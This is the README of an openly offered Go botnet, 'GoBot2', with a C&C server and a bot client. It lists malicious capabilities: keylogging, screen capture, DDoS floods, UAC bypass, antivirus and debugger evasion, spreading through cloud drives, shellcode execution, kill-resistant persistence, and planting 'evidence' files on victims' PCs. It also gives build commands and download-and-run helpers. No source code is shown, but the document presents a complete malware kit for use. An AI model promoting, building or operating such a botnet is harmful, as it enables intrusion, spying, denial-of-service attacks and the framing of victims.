# New project: https://github.com/SaturnsVoid/Project-Whis

# GoBot2

After seeing another users Go based botnet i wanted to do more work on my GoBot, But i ended up building something a bit more. There is issues with this but it more of a advanced PoC.... I am not a good coder but i was able to make this buy doing some basic reading online. 

# C&C Features:

*   Written in Go
*   Cross-Platform
*   SQL Database for Information
*   Secure Login System
*   Hard-Coded Login System
*   Simple to use HTML & CSS C&C
*   Console Based C&C
*   Tight Security (No PHP!)
*   Encoded and Obfuscated Data
*   HTTPS or HTTP
*   Single, Selected, All Command Issuing
*   User-Agent Detection
*   More

# Bot Features

*   Safe Error Handling
*   Have Unlimited Panels
*   Encoding and Obfuscation
*   Use HTTPS or HTTP
*   Old (>24Hr) Command Handling (Dont run commands that are old!)
*   Run PowerShell Scripts (Via URL, Parameters Accepted)
*   Advanced Torrent Seeder (uTorrent, BitTorrent Auto Download the client and runs hidden if needed)
*   Drive Spreader (with Name list)
*   Dropbox Spreader (with Name list)
*   Google Drive Spreader (with Name list)
*   OneDrive Spreader (with Name list)
*   Advanced Keylogger (Handles all keys, Window Titles, Clipboard, AutoStart, +more)
*   System Information (IP, WiFi, User, AV, IPConfig, CPU, GPU, SysInfo, Installed Software, .NET Framework, Refresher)
*   Screen Capture (Compression, Timed Capture, +more)
*   Download and Run (MD5 Hash Check, URL or Base64, Parameters, UAC Bypass, Zone Remover)
*   DDoS Methods (Threaded /w Interval, HTTPGet, TCPFlood, UDPFlood, Slowloris, HULK, TLSFlood, Bandwidth Drain, GoldenEye, Ace)
*   Bot Update (MD5 Hash Check, Admin, Zone Remover)
*   UPnP (Open TCP/UDP Ports)
*   Web-Server (Auto-UPnP port 80, Add/Edit Unlimited Pages)
*   Add Programs to Windows Firewall
*   HOST File Editor (Backup and Restore, Replace on Run, DNS Flusher)
*   Remote CMD
*   Detect Admin Rights
*   Bot ID Generation (Never the same)
*   Advanced Anti-Virus Bypass (Random Memory Allocation, Func HOP, Delays, Runtime Load DLLS /w Obf, Random Connection Times, + more)
*   Advanced Anti-Debug (isDebuggerPresent, Proc Detection, IP Organization Detection, File Name Detection, Reaction System)
*   Single Instance System
*   Reverse HTTP Proxy (Conf. Port, backend Servers)
*   Active Defense (Active Registry Defense, Active File Defense, Active WatchDog + more) Doesn't want to be killed.
*   UAC Bypass (Work all versions and current version of Windows 10 Pro 64Bit)
*   Advanced Install System (Dynamic Registry Keys, Dynamic File Names, Retain Admin Rights, Campaign Targeting (Only install in allowed Country's), Zone Remover, Adds self to Firewall)
*   Uninstall System (Removes all Traces)
*   Scripter (Batch, HTML, VBS, PS)
*   Run Shellcode (ThreadExecute)
*   Power Options (Shutdown, Restart, Logoff)
*   Startup Error Message
*   MessageBox (Returns Reply)
*   Open Website (Visible/Hidden)
*   Change Homepage
*   Change Background (URL or Base64)
*   Run .exe (UAC Bypass optimal)
*   Kill Self
*   Check if Proc is Running
*   Hide Process /w Active Mode
*   Disable/Enable (TaskManger, RedEdit, Command Prompt)
*   File Dropper (Place evedence on pc with no traces where it came from /w dir selection)


# How to Build and Use

Bot Settings are located in "Variables.go" Server Setting are located in "Server.go"

Compile GoBot.go with correct settings, Make a MySQL Database and import db file, Compile Server.go with correct settings

*   go build -o GoBot.exe -ldflags "-H windowsgui" "C:\\GoBot2\\GoBot.go"
*   go build -0 Server.exe "C:\\GoBot2\\Console Server\\Server.go"

Always compile with '-w -s' ldflags to strip any debug information from the binary.

# Included Tools

*   Tool for the project (Obfuscator (Char+1) and other crap. w/ source in VB.net)
*   Downloader.go (GoLANG Download and Run Example)
*   DownloaderWithUAC.go (GoLANG Download and Run Example with UAC Bypass)

# Obfuscator

It not really a Obfuscator all it does it move the Char +1 to and A = B, C = D, ect. Simple but it will slow down people wanting to mess with the program and also programs that search for keywords...

# Packages Used

*   github.com/NebulousLabs/go-upnp
*   golang.org/x/sys/windows/registry
*   github.com/AllenDang/w32
*   github.com/atotto/clipboard
*   github.com/StackExchange/wmi


# Other

Go is a amazing and powerful programming language. If you already haven't, check it out; https://golang.org/


